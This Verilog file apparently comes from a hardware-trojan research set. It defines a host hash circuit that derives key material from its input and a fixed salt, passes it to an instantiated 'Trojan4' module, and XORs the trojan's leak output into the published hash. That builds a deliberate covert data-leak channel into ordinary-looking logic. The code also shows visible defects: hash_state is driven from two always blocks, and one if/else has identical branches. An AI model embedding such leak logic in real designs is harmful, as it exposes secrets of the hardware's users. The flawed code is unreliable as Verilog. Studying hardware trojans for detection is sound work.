// Hash Host Circuit for Trojan4
// Fixed I/O to match Trojan4: clk, rst, key[63:0] -> leak[63:0]
module trojan4_hash_host #(
    parameter HASH_WIDTH = 32,   // Hash output width
    parameter MSG_BLOCKS = 4,    // Number of message blocks
    parameter [255:0] SALT_VALUE = 256'h123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0  // Salt for hashing
)(
    input wire clk,
    input wire rst,
    input wire [MSG_BLOCKS*32-1:0] message,
    input wire hash_start,
    output reg [HASH_WIDTH-1:0] hash_out,
    output reg hash_valid
);

    // Trojan interface (fixed width)
    wire [63:0] trojan_key;
    wire [63:0] trojan_leak;
    
    // Hash computation state
    reg [HASH_WIDTH-1:0] hash_state [0:3];  // 4-word hash state
    reg [MSG_BLOCKS*32-1:0] msg_buffer;
    reg [$clog2(MSG_BLOCKS)-1:0] block_counter;
    reg hashing;
    
    // Key derivation for trojan
    reg [255:0] salt_mix;
    reg [63:0] key_material;
    
    // Generate key material from message and salt
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            salt_mix <= SALT_VALUE;
            key_material <= 64'h0;
        end else if (hash_start || hashing) begin
            salt_mix <= {salt_mix[254:0], salt_mix[255] ^ salt_mix[127] ^ salt_mix[63]};
            key_material <= message[63:0] ^ salt_mix[63:0];
        end
    end
    
    assign trojan_key = key_material;
    
    // Initialize hash state
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            hash_state[0] <= 32'h67452301;
            hash_state[1] <= 32'hEFCDAB89;
            hash_state[2] <= 32'h98BADCFE;
            hash_state[3] <= 32'h10325476;
        end
    end
    
    // Hash computation FSM
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            msg_buffer <= {(MSG_BLOCKS*32){1'b0}};
            block_counter <= {$clog2(MSG_BLOCKS){1'b0}};
            hashing <= 1'b0;
            hash_valid <= 1'b0;
        end else begin
            if (hash_start && !hashing) begin
                msg_buffer <= message;
                block_counter <= {$clog2(MSG_BLOCKS){1'b0}};
                hashing <= 1'b1;
                hash_valid <= 1'b0;
            end else if (hashing) begin
                // Simple hash round (mix current block with state)
                hash_state[0] <= hash_state[0] ^ msg_buffer[31:0];
                hash_state[1] <= hash_state[1] + msg_buffer[63:32];
                hash_state[2] <= hash_state[2] ^ msg_buffer[95:64];
                hash_state[3] <= hash_state[3] + msg_buffer[127:96];
                
                // Rotate message buffer
                msg_buffer <= {msg_buffer[31:0], msg_buffer[MSG_BLOCKS*32-1:32]};
                
                if (block_counter >= $clog2(MSG_BLOCKS)'(MSG_BLOCKS-1)) begin
                    hashing <= 1'b0;
                    hash_valid <= 1'b1;
                end else begin
                    block_counter <= block_counter + 1;
                end
            end else begin
                hash_valid <= 1'b0;
            end
        end
    end
    
    // Output with trojan leak integration
    always @(posedge clk or posedge rst) begin
        if (rst)
            hash_out <= {HASH_WIDTH{1'b0}};
        else if (hash_valid) begin
            // Mix hash result with trojan leak
            if (HASH_WIDTH >= 64)
                hash_out <= (hash_state[0] ^ hash_state[1]) ^ trojan_leak[HASH_WIDTH-1:0];
            else
                hash_out <= (hash_state[0] ^ hash_state[1]) ^ trojan_leak[HASH_WIDTH-1:0];
        end
    end
    
    // Instantiate Trojan4
    Trojan4 trojan_inst (
        .clk(clk),
        .rst(rst),
        .key(trojan_key),
        .leak(trojan_leak)
    );

endmodule
